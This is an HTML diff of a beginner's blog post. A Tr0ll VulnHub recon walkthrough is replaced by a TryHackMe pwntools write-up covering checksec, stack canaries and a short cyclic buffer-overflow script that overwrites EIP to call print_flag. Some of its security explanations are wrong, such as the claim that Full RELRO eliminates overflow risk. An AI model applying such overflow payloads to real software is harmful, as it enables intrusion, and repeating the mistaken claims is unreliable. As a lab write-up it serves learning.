@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF Tr0ll | Peanutstick</title>
+  <title>Intro To Pwntools | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF Tr0ll | Peanutstick">
+  <meta name="description" content="Intro To Pwntools | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;introtopwntools So I’m connected with ssh on the box: Checksec Does Intro2pwn1 have FULL RELROFull RELRO makes the entire GOT read-only which removes the ability to perform">
 <meta property="og:type" content="article">
@@ -1161,9 +1161,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF_Tr0ll" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Intro To Pwntools" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF Tr0ll</h1>
+        <h1 class="article-title">Intro To Pwntools</h1>
     
     <div class="article-meta">
         
@@ -1173,7 +1173,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="CTF">CTF</a>
+            <a  data-rel="Security">Security</a>
             
         </span>
         
@@ -1188,12 +1188,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-09-27 09:49:11'>2021-10-02 01:15</time>
+            Created At : <time class="date" title='Updated At: 2023-03-05 10:37:47'>2023-03-01 00:40</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:114</span>
+        <span>Count:432</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1212,7 +1212,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Discovery"><span class="toc-text">Discovery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scanning"><span class="toc-text">Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-80"><span class="toc-text">Port 80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirbuster"><span class="toc-text">Dirbuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nikto"><span class="toc-text">Nikto</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cyclic"><span class="toc-text">cyclic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Networking"><span class="toc-text">Networking</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1228,17 +1228,80 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h1><p><a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a></p>
-<p>Tr0ll was inspired by the constant trolling of the machines within the <code>OSCP labs</code>.<br>The goal is simple, gain root and get <code>Proof.txt</code> from the <code>/root directory</code>.<br>Not for the easily frustrated! Fair warning, there be trolls ahead!<br>Difficulty: Beginner ; Type: boot2root</p>
-<h1 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h1><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>sudo netdiscover<br><img src="https://i.imgur.com/eXGJ3Sq.png"></p>
-<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap -sV -p- 192.168.0.24<br><img src="https://i.imgur.com/VNTKVkg.png"></p>
-<h2 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80"></a>Port 80</h2><p><img src="https://i.imgur.com/PdbHzaR.png"><br>There is nothing intresting in the source code of this page.<br>Let&#39;s see what is in the <code>robots.txt</code>.</p>
-<pre class="line-numbers language-none"><code class="language-none">User-agent:*
-Disallow: &#x2F;secret
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/PMu5eIT.png"><br>…yes</p>
-<h2 id="Dirbuster"><a href="#Dirbuster" class="headerlink" title="Dirbuster"></a>Dirbuster</h2><p><img src="https://i.imgur.com/VIgbvJ5.png"><br>Too many errors for me, I will search for something else.</p>
-<h2 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h2><p><img src="https://i.imgur.com/DtyYOiE.png"><br>Nothing intresting on the port 80, I already know for the secret and robot.txt.</p>
+        <p><a href="https://tryhackme.com/room/introtopwntools">https://tryhackme.com/room/introtopwntools</a></p>
+<p>So I’m connected with ssh on the box:<br><img src="https://i.imgur.com/dSAu5n5.png"></p>
+<h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><ol>
+<li>Does Intro2pwn1 have FULL RELRO<br>Full RELRO makes the entire GOT read-only which removes the ability to perform a “GOT overwrite” attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run.</li>
+</ol>
+<p>So it’s more secure and eliminate the risk of buffer overflows.<br><a href="https://ctf101.org/binary-exploitation/relocation-read-only/">https://ctf101.org/binary-exploitation/relocation-read-only/</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec intro2pwn1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/K98beFt.png"><br>YES</p>
+<ol start="2">
+<li>Does Intro2pwn1 have RWX segments<br><em>RWX</em>: Tells us, if the binary has <em>segments</em><br>We don’t see it in the output of checksec.</li>
+</ol>
+<p>NO</p>
+<ol start="3">
+<li>Does Intro2pwn2 have a stack canary<br><img src="https://i.imgur.com/JdGkLYE.png"></li>
+</ol>
+<p><strong>Stack canaries</strong> are tokens placed after a stack to detect a stack overflow.<br>This allows the program to detect a buffer overflow and shut down.</p>
+<p>NO</p>
+<ol start="4">
+<li>Does Intro2pwn2 not have PIE</li>
+</ol>
+<p><strong>PIE</strong> stands for Position Independent Executable.<br>This loads the program dependencies into random locations</p>
+<p>Exemple without PIE:<br>He create a shared library</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cc -fpic -shared -I. -nostdlib  
+              -nodefaultlibs      
+              -o libnotc.so       
+              os/syscall.x86_64.s 
+              os/syscall.c        
+              not/strlen.c        
+              not/puts.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Then recompile it</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cc -nostdlib -nodefaultlibs -I. 
+              -o dynamic-example  
+              os/start.x86_64.s   
+              main.c -L. -lnotc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/x6xQ9N2.png"></p>
+<ol start="5">
+<li>Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?<br><img src="https://i.imgur.com/INR4Sfc.png"></li>
+</ol>
+<p>A stack buffer overflow can be caused deliberately as part of an attack known as <strong>stack smashing</strong>. it’s mean you can use it to gain acess on a machine</p>
+<ol start="6">
+<li>Now cause a buffer overflow on intro2pwn2. What error do you get?<br><img src="https://i.imgur.com/IrTNpxt.png"><br>so, if there is no stack smashing, can i use it to gain acess on the mavhine ?</li>
+</ol>
+<h1 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h1><p>In this chapter we learn to do a bufferoverflow when the canary protection is missing.<br>you can see that with <code>checksec</code>.<br><img src="https://i.imgur.com/hV2EIHW.png"></p>
+<p>We alsolern how to convert from hex to ascii, and acsii to hex.</p>
+<p>With gdb you can locate the function print_flag() like this.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">info <span class="token keyword">function</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/7QOFFcM.png"><br>Or like this:</p>
+<pre class="line-numbers language-none"><code class="language-none">print&amp; print_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/FRyYlmI.png"><br>Then in a python script we have to change the value of eip:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>cyclic_find<span class="token punctuation">(</span><span class="token string">'jaaa'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#eip = p32(0xdeadbeef)</span>
+eip <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x8048536</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> padding <span class="token operator">+</span> eip
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>The output of payload should be printed in a file to be used later:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python pwn_cyclic.py <span class="token operator">></span> attack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>in this file it’s looking like this:<br><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6</code><br><img src="https://i.imgur.com/5e0fIIP.png"></p>
+<h1 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">Dear buzz,
+
+I&#39;m running a service on port 1337, which has an overflow vulnerability.
+I&#39;ve left you a version that will run on port 1336 so that you can develop
+your exploit. 
+
+Sincerely,
+dizmas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/ULfM5je.png"></p>
 
       
        
